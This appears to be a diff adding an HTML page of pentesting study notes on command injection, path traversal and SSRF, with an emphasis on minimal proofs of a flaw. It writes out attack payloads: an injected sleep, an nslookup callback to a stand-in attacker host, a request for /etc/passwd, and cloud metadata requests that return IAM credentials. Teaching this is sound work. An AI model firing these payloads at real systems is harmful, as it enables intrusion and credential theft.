@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <!-- ========== META INFORMATION ========== -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Vishnu Gandarapu - developer notes.">
+
+    <title>Pentesting Notes - Injection and SSRF</title>
+    <link rel="stylesheet" href="../style.css">
+</head>
+
+<body>
+    <h2>Injection and SSRF</h2>
+    <p><strong>Difficulty:</strong> Hard</p>
+
+    <p>
+        The rest of the input-handling family follows one theme: user input reaching somewhere it should not — a shell, a
+        file path, or an outbound request. Each has a gentle proof and a hard stop, so you demonstrate the flaw without
+        detonating anything.
+    </p>
+
+    <h3>Command injection</h3>
+
+    <p>
+        When input reaches a system shell, you can run commands. Prove it with a harmless <strong>timing</strong> or
+        <strong>DNS callback</strong>, never <code>rm</code>-anything:
+    </p>
+
+    <pre><code>ping.php?host=8.8.8.8; sleep 5        # response takes 5s longer -> injection
+ping.php?host=8.8.8.8; nslookup me.attacker-dns.test   # a DNS hit you control</code></pre>
+
+    <p>
+        A five-second delay, or a lookup arriving at a DNS server you own, proves execution without touching a single
+        file.
+    </p>
+
+    <h3>Path traversal</h3>
+
+    <p>
+        When a filename comes from user input, <code>../</code> sequences can escape the intended directory and read
+        files elsewhere:
+    </p>
+
+    <pre><code>download?file=../../../../etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</code></pre>
+
+    <p>
+        Read one expected, harmless file to prove the escape works — then stop. You do not need to pull secrets to
+        demonstrate the directory boundary is broken.
+    </p>
+
+    <h3>SSRF and cloud metadata</h3>
+
+    <p>
+        Server-Side Request Forgery makes the server fetch a URL <em>you</em> choose. The minimal proof is making it
+        reach a listener you control and showing the inbound hit. In cloud environments the prize is the metadata
+        endpoint, which hands out temporary IAM credentials to anything on the box:
+    </p>
+
+    <pre><code>fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
+    -> role-name
+
+fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
+    -> { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }</code></pre>
+
+    <p>
+        Retrieving the role name (or a callback to your listener) is enough to prove SSRF. Do <strong>not</strong> take
+        the credentials and pivot into the cloud account unless that is explicitly scoped — that crosses from proving a
+        bug to breaking in.
+    </p>
+
+    <p>
+        Across all of these the discipline is the same: boolean diff over table dump, listener hit over cloud takeover,
+        one file read over a directory sweep. The smallest convincing proof is both safer and more professional.
+    </p>
+
+    <p>
+        Next: Wireless
+        <a href="./9-wireless.html">&gt;&gt;</a>
+    </p>
+
+    <p>
+        Previous: Cross-site scripting
+        <a href="./8-xss.html">&lt;&lt;</a>
+    </p>
+
+    <script src="../footer.js"></script>
+    <script src="../home.js"></script>
+    <script src="/comments.js" defer></script>
+</body>
+
+</html>
